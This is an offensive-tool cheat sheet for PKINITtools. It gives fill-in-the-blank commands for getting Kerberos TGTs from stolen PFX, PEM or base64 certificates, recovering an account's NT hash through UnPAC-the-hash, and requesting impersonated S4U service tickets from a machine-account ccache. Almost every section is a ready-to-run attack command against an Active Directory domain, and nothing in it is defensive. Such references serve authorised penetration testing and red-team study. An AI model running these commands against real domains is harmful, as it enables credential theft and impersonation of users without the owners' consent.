# PKINITtools

## gettgtpkinit.py

### TGT from PFX

Request a TGT through PKINIT using a PFX certificate and write it as a ccache.

```sh title:"PKINITtools PKINIT TGT from PFX"
gettgtpkinit.py -cert-pfx "$pfx_file" -pfx-pass "$pfx_pass" "$domain/$target_samname" "$ccache_file"
```
<!-- cheat
var pfx_file
var pfx_pass
var domain
var target_samname
var ccache_file
-->

### TGT from PEM cert and key

Request a TGT through PKINIT using separate PEM certificate and key files.

```sh title:"PKINITtools PKINIT TGT from PEM cert and key"
gettgtpkinit.py -cert-pem "$pem_cert" -key-pem "$pem_key" "$domain/$target_samname" "$ccache_file"
```
<!-- cheat
var pem_cert
var pem_key
var domain
var target_samname
var ccache_file
-->

### TGT with base64 PFX

Request a TGT using a base64-encoded PFX blob.

```sh title:"PKINITtools PKINIT TGT from base64 PFX"
gettgtpkinit.py -pfx-base64 "$pfx_base64" -pfx-pass "$pfx_pass" "$domain/$target_samname" "$ccache_file"
```
<!-- cheat
var pfx_base64
var pfx_pass
var domain
var target_samname
var ccache_file
-->

## getnthash.py

### UnPAC-the-hash

Use the AS-REP key printed by `gettgtpkinit.py` to recover the account NT hash from the PKINIT TGT.

```sh title:"PKINITtools Recover NT hash from PKINIT TGT"
KRB5CCNAME="$ccache_file" getnthash.py -key "$as_rep_key" "$domain/$target_samname"
```
<!-- cheat
var ccache_file
var as_rep_key
var domain
var target_samname
-->

## gets4uticket.py

### S4U ticket from machine ccache

Use a machine-account ccache to request an impersonated service ticket.

```sh title:"PKINITtools S4U service ticket from machine ccache"
gets4uticket.py "kerberos+ccache://$domain\\$machine_account:$ccache_file@$dc_fqdn" "$spn@$domain" "$impersonate_user@$domain" "$output_ccache" -v
```
<!-- cheat
var domain
var machine_account
var ccache_file
var dc_fqdn
var spn
var impersonate_user
var output_ccache
-->

### Use S4U ticket

Export the generated ccache for Kerberos-aware tools.

```sh title:"PKINITtools Use generated S4U ccache"
export KRB5CCNAME="$output_ccache"
```
<!-- cheat
var output_ccache
-->
